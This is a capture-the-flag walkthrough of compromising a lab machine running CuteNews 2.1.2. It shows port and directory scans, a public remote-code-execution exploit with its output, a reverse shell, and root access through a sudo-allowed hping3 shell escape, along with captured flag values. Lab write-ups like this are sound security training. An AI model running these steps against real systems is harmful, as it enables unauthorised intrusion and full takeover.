-> I started by enumerating the machine
```
┌──(root㉿kali)-[/home/astra]
└─# nmap -p- --min-rate 10000 -Pn -sV 192.168.209.128
Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-26 13:12 EST
Nmap scan report for 192.168.209.128
Host is up (0.13s latency).
Not shown: 65530 closed tcp ports (reset)
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
80/tcp  open  http     Apache httpd 2.4.38 ((Debian))
88/tcp  open  http     nginx 1.14.2
110/tcp open  pop3     Courier pop3d
995/tcp open  ssl/pop3 Courier pop3d
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.24 seconds
```
-> We found a couple of open ports, but nothing to much, going to web it just shows apache2 default page, so I use gobuster to find hidden directories
```
┌──(root㉿kali)-[/home/astra]
└─# gobuster dir -u http://192.168.209.128/ -w /usr/share/wordlists/dirb/common.txt -t 150
===============================================================
Gobuster v3.4
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.209.128/
[+] Method:                  GET
[+] Threads:                 150
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.4
[+] Timeout:                 10s
===============================================================
2023/02/26 13:17:16 Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 280]
/.htaccess            (Status: 403) [Size: 280]
/.htpasswd            (Status: 403) [Size: 280]
/core                 (Status: 301) [Size: 317] [--> http://192.168.209.128/core/]
/docs                 (Status: 301) [Size: 317] [--> http://192.168.209.128/docs/]
/favicon.ico          (Status: 200) [Size: 1150]
/index.html           (Status: 200) [Size: 10701]
/index.php            (Status: 200) [Size: 6175]
/libs                 (Status: 301) [Size: 317] [--> http://192.168.209.128/libs/]
/manual               (Status: 301) [Size: 319] [--> http://192.168.209.128/manual/]
/server-status        (Status: 403) [Size: 280]
/skins                (Status: 301) [Size: 318] [--> http://192.168.209.128/skins/]
/uploads              (Status: 301) [Size: 320] [--> http://192.168.209.128/uploads/]

===============================================================
2023/02/26 13:17:21 Finished
===============================================================
```
-> Found an index.php, getting there its a login page
![loginpageweb](https://user-images.githubusercontent.com/47869173/221430595-f203004e-707f-4ef9-8d04-30e1ea3bc32a.png)

-> We found its "powered by Cutenews 2.1.2", so I go to msfconsole to search for an exploit
```
msf6 > searchsploit CuteNews 2.1.2
[*] exec: searchsploit CuteNews 2.1.2

---------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                        |  Path
---------------------------------------------------------------------------------------------------------------------- ---------------------------------
CuteNews 2.1.2 - 'avatar' Remote Code Execution (Metasploit)                                                          | php/remote/46698.rb
CuteNews 2.1.2 - Arbitrary File Deletion                                                                              | php/webapps/48447.txt
CuteNews 2.1.2 - Authenticated Arbitrary File Upload                                                                  | php/webapps/48458.txt
CuteNews 2.1.2 - Remote Code Execution                                                                                | php/webapps/48800.py
---------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
msf6 > 
```
-> We found a RCE (Remote Code Execution), so we will use it!

-> https://www.exploit-db.com/exploits/48800 

-> After downloading the script, we need to do a few tweaks, since our server dont use /CuteNews/index.php, its direct to index.php, after that we execute the script!
```
┌──(root㉿kali)-[/home/astra]
└─# python3 48800.py



           _____     __      _  __                     ___   ___  ___ 
          / ___/_ __/ /____ / |/ /__ _    _____       |_  | <  / |_  |
         / /__/ // / __/ -_)    / -_) |/|/ (_-<      / __/_ / / / __/ 
         \___/\_,_/\__/\__/_/|_/\__/|__,__/___/     /____(_)_(_)____/ 
                                ___  _________                        
                               / _ \/ ___/ __/                        
                              / , _/ /__/ _/                          
                             /_/|_|\___/___/                          
                                                                      

                                                                                                                                                   

[->] Usage python3 expoit.py

Enter the URL> http://192.168.209.128  
================================================================
Users SHA-256 HASHES TRY CRACKING THEM WITH HASHCAT OR JOHN
================================================================
[-] No hashes were found skipping!!!
================================================================

=============================
Registering a users
=============================
[+] Registration successful with username: A0yMERYyeh and password: A0yMERYyeh

=======================================================
Sending Payload
=======================================================
signature_key: 26c5ac9d8a393b84ed1db578eef6f2fc-A0yMERYyeh
signature_dsi: 3102d2e120fff873c67b5073149d75f2
logged in user: A0yMERYyeh
============================
Dropping to a SHELL
============================

command > 
```
-> Now we got a shell, now I will reverse a connection with netcat
![reversenetcatshell](https://user-images.githubusercontent.com/47869173/221430580-e8320271-71e1-418f-8a9c-c25377f9032c.png)

-> We are in, lets get the first flag!
```
www-data@cute:/$ cd home
cd home
www-data@cute:/home$ ls
ls
fox
www-data@cute:/home$ cd fox
cd fox
www-data@cute:/home/fox$ ls
ls
user.txt
www-data@cute:/home/fox$ cat user.txt
cat user.txt
Your flag is in another file...
www-data@cute:/home/fox$ 
```
-> When trying, I found an user called fox, I know the flag is called local.txt so I do a find command and search for it!
```
www-data@cute:/var/www/html/uploads$ cat /var/www/local.txt
cat /var/www/local.txt
cf8de8342b5284ce974a875b5c3c75d7
www-data@cute:/var/www/html/uploads$ 
```
-> And we got the first flag, now we need to escalate privileges, I look for things that can be executed with sudo permissions on the current user
```
www-data@cute:/var/www/html/uploads$ sudo -l
sudo -l
Matching Defaults entries for www-data on cute:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on cute:
    (root) NOPASSWD: /usr/sbin/hping3 --icmp
www-data@cute:/var/www/html/uploads$ 
```
-> Since I have a non-TTY shell, I will try to spawn a TTY shell
```
www-data@cute:/var/www/html/uploads$ python3 -c "__import__('pty').spawn('/bin/bash')"
<$ python3 -c "__import__('pty').spawn('/bin/bash')"                                                                                                    
www-data@cute:/var/www/html/uploads$ sudo /usr/sbin/hping3                                                                                              
sudo /usr/sbin/hping3                                                                                                                                   
                                                                                                                                                        
We trust you have received the usual lecture from the local System                                                                                      
Administrator. It usually boils down to these three things:                                                                                             
                                                                                                                                                        
    #1) Respect the privacy of others.                                                                                                                  
    #2) Think before you type.                                                                                                                          
    #3) With great power comes great responsibility.                                                                                                    
                                                                                                                                                        
[sudo] password for www-data:   
```
-> Now we got a TTY shell, and can continue, searching for a way to get root with hping3 I found this on GTFObins // hping3 ; /bin/bash -p
```
www-data@cute:/var/www/html/uploads$ hping3
hping3
hping3> /bin/bash -p
/bin/bash -p
bash-5.0# id
id
uid=33(www-data) gid=33(www-data) euid=0(root) egid=0(root) groups=0(root),33(www-data)
bash-5.0# cat proof.txt
cat proof.txt
3770530a8eb23d7dd7174888b61acad2
bash-5.0# 
```
-> And we got the flag!



